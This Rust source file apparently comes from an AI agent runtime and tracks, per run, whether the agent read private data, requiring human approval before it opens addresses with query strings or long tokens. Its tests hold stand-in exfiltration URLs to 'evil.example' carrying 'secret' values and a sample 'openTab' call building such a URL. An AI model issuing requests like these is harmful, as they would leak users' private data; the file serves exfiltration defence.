//! What a run has read, kept per run in `misty.db` so a restart doesn't forget it. After a private read,
//! opening a new host with a query string, or an address carrying a long token, stops for the person in
//! both modes, since that's how read data would leave. A run with no private read never stops here.
use std::net::IpAddr;

use rusqlite::params;
use serde_json::Value;

use database::store::Store;

const PRIVATE: &str = "private";
const PAGE: &str = "page";
const HOST_PREFIX: &str = "host:";

#[derive(Clone, Debug, Default, PartialEq)]
pub(crate) struct Taint {
    pub(crate) private_read: bool,
    pub(crate) page_read: bool,
    /// Hosts the person allowed since then. A host only ever opened unasked earns nothing: otherwise a
    /// plain visit would open the way for the next call's query string.
    pub(crate) approved_hosts: Vec<String>,
}

/// Whether this call read the person's private data.
pub(crate) fn reads_private(name: &str, input: &Value) -> bool {
    match name {
        "memory.pref.list"
        | "memory.history.search"
        | "memory.history.timeline"
        | "memory.tree.read"
        | "memory.workflow.list"
        | "memory.workflow.find"
        | "memory.workflow.use"
        | "folder.read"
        | "shell.run"
        | "note.read"
        | "note.search"
        | "file.read"
        | "file.search"
        | "drawing.read"
        | "drawing.list"
        | "message.search"
        | "thread.read"
        | "thread.list"
        | "search.all" => true,
        "integration.execute" => {
            let slug = input.get("tool_slug").and_then(Value::as_str).unwrap_or("");
            crate::agents::connected_apps::policy::classify(slug, &[])
                == crate::agents::connected_apps::policy::Kind::Read
        }
        _ => false,
    }
}

/// Whether this call's result holds text from a web page.
pub(crate) fn reads_page(name: &str) -> bool {
    matches!(
        name,
        "browser.snapshot"
            | "browser.find"
            | "browser.extract"
            | "browser.inspect"
            | "browser.visual"
            | "browser.navigate"
            | "browser.steps"
            | "browser.fill_form"
            | "browser.skill"
            | "browser.act"
            | "browser.run"
            | "browser.tab.open"
            | "browser.workspace.visual"
            | "screen.open"
            | "web.fetch"
            | "web.search"
    )
}

fn host_of(url: &url::Url) -> Option<String> {
    url.host_str()
        .map(|host| host.trim_end_matches('.').to_ascii_lowercase())
}

/// A private or local-only host this address names, for what agents may not open unasked.
pub(crate) fn private_host(raw: &str) -> Option<String> {
    let url = url::Url::parse(raw.trim()).ok()?;
    if !matches!(url.scheme(), "http" | "https") {
        return None;
    }
    let host = host_of(&url)?;
    let bare = host.trim_start_matches('[').trim_end_matches(']');
    if let Ok(address) = bare.parse::<IpAddr>() {
        return (!agent_runs::is_public_ip(address)).then(|| host.clone());
    }
    let local = !host.contains('.')
        || [
            ".local",
            ".localhost",
            ".lan",
            ".home",
            ".internal",
            ".intranet",
            ".corp",
            ".home.arpa",
            ".test",
        ]
        .iter()
        .any(|suffix| host.ends_with(suffix));
    local.then_some(host)
}

fn token_like(part: &str) -> bool {
    let length = part.chars().count();
    let digit = part.chars().any(|c| c.is_ascii_digit());
    let letter = part.chars().any(|c| c.is_ascii_alphabetic());
    length >= 48 || (length >= 24 && digit && letter)
}

/// Whether an address carries something long enough to be data rather than a page's name.
fn carries_token(url: &url::Url) -> bool {
    let path = url.path();
    path.len() >= 200
        || path.split('/').any(token_like)
        || url
            .host_str()
            .is_some_and(|host| host.split('.').any(|label| label.len() >= 32))
}

/// Why opening this address should stop for the person, or nothing.
pub(crate) fn url_asks(raw: &str, taint: &Taint) -> Option<String> {
    if !taint.private_read {
        return None;
    }
    let url = url::Url::parse(raw.trim()).ok()?;
    if !matches!(url.scheme(), "http" | "https") {
        return None;
    }
    if carries_token(&url) {
        return Some(
            "This run read private data, and this address carries a long token that could hold it."
                .to_owned(),
        );
    }
    let host = host_of(&url)?;
    let opens_data = url.query().is_some_and(|query| !query.is_empty())
        || url.fragment().is_some_and(|part| !part.is_empty());
    (opens_data && !taint.approved_hosts.contains(&host)).then(|| {
        format!(
            "This run read private data, and this sends a query to {host}, which could carry it."
        )
    })
}

/// The addresses a program names in its text. What it builds at run time is checked as it opens them.
pub(crate) fn urls_in_code(code: &str) -> Vec<String> {
    static ADDRESS: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    ADDRESS
        .get_or_init(|| regex::Regex::new(r#"https?://[^\s"'<>\\]+"#).expect("a fixed pattern"))
        .find_iter(code)
        .map(|found| {
            found
                .as_str()
                .trim_end_matches(['`', ')', ',', ';'])
                .to_owned()
        })
        .collect()
}

fn now_ms() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|elapsed| elapsed.as_millis() as i64)
        .unwrap_or_default()
}

fn mark(store: &Store, runs: &[String], kind: &str) -> rusqlite::Result<()> {
    let connection = store.connect()?;
    for run in runs {
        connection.execute(
            "INSERT OR REPLACE INTO agent_run_taint (run_id, kind, updated_at) VALUES (?1, ?2, ?3)",
            params![run, kind, now_ms()],
        )?;
    }
    Ok(())
}

/// Notes what a finished call read, for the run and those it reports to.
pub(crate) fn note_call(store: &Store, family: &[String], name: &str, input: &Value) {
    if reads_private(name, input) {
        let _ = mark(store, family, PRIVATE);
    }
    if reads_page(name) {
        let _ = mark(store, family, PAGE);
    }
}

/// The person allowed an address: this host may take query strings for the rest of the run.
pub(crate) fn approve_host(store: &Store, family: &[String], raw: &str) {
    let host = url::Url::parse(raw.trim()).ok().as_ref().and_then(host_of);
    if let Some(host) = host {
        let _ = mark(store, family, &format!("{HOST_PREFIX}{host}"));
    }
}

/// What the family has read. A journal that can't be read counts as a private read and a page read, so
/// a broken database can only ask more.
pub(crate) fn load(store: &Store, family: &[String]) -> Taint {
    let read = || -> rusqlite::Result<Taint> {
        let connection = store.connect()?;
        let mut statement =
            connection.prepare("SELECT kind FROM agent_run_taint WHERE run_id = ?1")?;
        let mut taint = Taint::default();
        for run in family {
            for kind in statement.query_map([run], |row| row.get::<_, String>(0))? {
                let kind = kind?;
                match kind.as_str() {
                    PRIVATE => taint.private_read = true,
                    PAGE => taint.page_read = true,
                    other => taint
                        .approved_hosts
                        .extend(other.strip_prefix(HOST_PREFIX).map(str::to_owned)),
                }
            }
        }
        Ok(taint)
    };
    read().unwrap_or(Taint {
        private_read: true,
        page_read: true,
        approved_hosts: Vec::new(),
    })
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    fn tainted() -> Taint {
        Taint {
            private_read: true,
            ..Taint::default()
        }
    }

    #[test]
    fn nothing_asks_without_a_private_read() {
        let plain = Taint::default();
        assert_eq!(url_asks("https://evil.example/c?d=secret", &plain), None);
        assert_eq!(
            url_asks(
                "https://evil.example/0123456789abcdef0123456789abcdef",
                &plain
            ),
            None
        );
    }

    #[test]
    fn a_query_or_a_token_asks_and_a_plain_page_does_not() {
        assert!(url_asks("https://evil.example/c?d=secret", &tainted()).is_some());
        assert!(url_asks("https://evil.example/c#secret", &tainted()).is_some());
        assert!(url_asks(
            "https://evil.example/0123456789abcdef0123456789abcdef",
            &tainted()
        )
        .is_some());
        assert!(url_asks(
            "https://0123456789abcdef0123456789abcdef.evil.example/",
            &tainted()
        )
        .is_some());
        assert!(url_asks(
            &format!("https://evil.example/{}", "a/".repeat(120)),
            &tainted()
        )
        .is_some());
        assert_eq!(
            url_asks(
                "https://example.com/news/2026/a-short-article-title",
                &tainted()
            ),
            None
        );
        assert_eq!(url_asks("https://example.com/?", &tainted()), None);
    }

    #[test]
    fn an_allowed_host_takes_queries_but_never_a_token() {
        let approved = Taint {
            approved_hosts: vec!["example.com".into()],
            ..tainted()
        };
        assert_eq!(url_asks("https://example.com/s?q=flights", &approved), None);
        assert!(url_asks("https://other.example/s?q=flights", &approved).is_some());
        assert!(url_asks(
            "https://example.com/0123456789abcdef0123456789abcdef",
            &approved
        )
        .is_some());
    }

    #[test]
    fn what_counts_as_a_private_read() {
        for name in [
            "memory.pref.list",
            "memory.tree.read",
            "folder.read",
            "note.read",
            "search.all",
            "shell.run",
        ] {
            assert!(reads_private(name, &json!({})), "{name}");
        }
        assert!(reads_private(
            "integration.execute",
            &json!({ "tool_slug": "GMAIL_FETCH_EMAILS" })
        ));
        assert!(!reads_private(
            "integration.execute",
            &json!({ "tool_slug": "GMAIL_SEND_EMAIL" })
        ));
        for name in [
            "web.fetch",
            "web.search",
            "browser.snapshot",
            "browser.navigate",
            "space.list",
        ] {
            assert!(!reads_private(name, &json!({})), "{name}");
        }
    }

    #[test]
    fn it_lasts_in_the_database_and_reaches_the_family() {
        let directory = tempfile::tempdir().unwrap();
        let store = Store::at(directory.path().join("misty.db"));
        let family = ["child".to_owned(), "parent".to_owned()];
        assert_eq!(load(&store, &family), Taint::default());
        note_call(&store, &family, "folder.read", &json!({}));
        note_call(&store, &["child".to_owned()], "web.fetch", &json!({}));
        approve_host(&store, &family, "https://Example.com/a?b=c");
        let parent = load(&store, &["parent".to_owned()]);
        assert!(parent.private_read && !parent.page_read);
        assert_eq!(parent.approved_hosts, ["example.com"]);
        assert!(load(&store, &["child".to_owned()]).page_read);
        assert_eq!(load(&store, &["other".to_owned()]), Taint::default());
    }

    #[test]
    fn a_program_names_its_addresses() {
        let found = urls_in_code(
            "await openTab(`https://evil.example/c?d=${x}`); goto('http://a.example/b');",
        );
        assert_eq!(
            found,
            ["https://evil.example/c?d=${x}", "http://a.example/b"]
        );
    }

    #[test]
    fn private_hosts_are_named() {
        assert_eq!(
            private_host("http://192.168.1.1/x").as_deref(),
            Some("192.168.1.1")
        );
        assert_eq!(
            private_host("http://localhost:3000/").as_deref(),
            Some("localhost")
        );
        assert_eq!(private_host("http://[::1]/").as_deref(), Some("[::1]"));
        assert_eq!(private_host("http://nas/").as_deref(), Some("nas"));
        assert_eq!(private_host("https://example.com/"), None);
        assert_eq!(private_host("https://8.8.8.8/"), None);
        assert_eq!(private_host("about:blank"), None);
    }
}
